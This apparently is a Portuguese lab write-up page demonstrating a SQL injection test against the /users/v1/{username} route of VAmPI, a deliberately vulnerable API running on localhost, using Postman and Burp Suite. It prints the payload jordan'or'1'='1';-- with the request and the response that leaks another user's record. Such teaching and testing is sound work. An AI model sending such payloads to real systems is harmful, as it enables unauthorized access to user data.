---
sidebar_position: 2
---

# Exploração

Existem alguns métodos usados para identificar uma falha de SQL Injection, seja por meio de uma revisão do código fonte (em casos de testes white box), por meio da injeção maliciosa de string em inputs de dados de uma API, ferramentas de scan de vulnerabilidades etc.

## Vulnerabilidade na rota `/users/v1/{username}`
Inicialmente, foi usado o PostMan para enviar uma requisição do tipo `GET` com o username **jordan** como parâmetro e, posteriormente, analisar com o Burp Suite:

```js title="GET /users/v1/{username}"
GET /users/v1/jordan HTTP/1.1
User-Agent: PostmanRuntime/7.29.2
Accept: */*
Postman-Token: a6523c6b-4739-4b55-b9ed-9347a58845b8
Host: localhost:5000
Accept-Encoding: gzip, deflate
Connection: close
```

A resposta recebida foi:

```js title="Response"
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 56
Server: Werkzeug/1.0.1 Python/3.8.10
Date: Fri, 30 Sep 2022 17:26:17 GMT

{
    "username": "jordan", 
    "email": "jjga.snf19@uea.edu.br"
}
```
Ao ter ciência do response legítimo enviado pela API para o usuário **jordan** na respectiva rota, é possível testar a sua fragilidade para o SQL Injection manipulando a requisição com um parâmetro malicioo.

No Burp Suite, enviaremos novamente a requisição alterando o parâmetro da requisição para `jordan'or'1'='1';--`

```js title="GET /users/v1/jordan'or'1'='1';--"
GET /users/v1/jordan'or'1'='1';-- HTTP/1.1
User-Agent: PostmanRuntime/7.29.2
Accept: */*
Postman-Token: a6523c6b-4739-4b55-b9ed-9347a58845b8
Host: localhost:5000
Accept-Encoding: gzip, deflate
Connection: close
```
Então, obtivemos a seguinte resposta do VAmPI:
```js title="SQL Injection Response"
HTTP/1.0 200 OK
Content-Type: application/json
Content-Length: 48
Server: Werkzeug/1.0.1 Python/3.8.10
Date: Fri, 30 Sep 2022 18:33:14 GMT

{
    "username": "name1",
    "email": "mail1@mail.com"
}
```
Ao compararmos o body de ambas as responses, podemos notar que o endpoint usado para retornar as informações de um usuário é suscetível ao SQL Injection.

#### Mais referências disponíveis na [OWASP](https://github.com/OWASP/API-Security/blob/master/2019/en/src/0xa8-injection.md).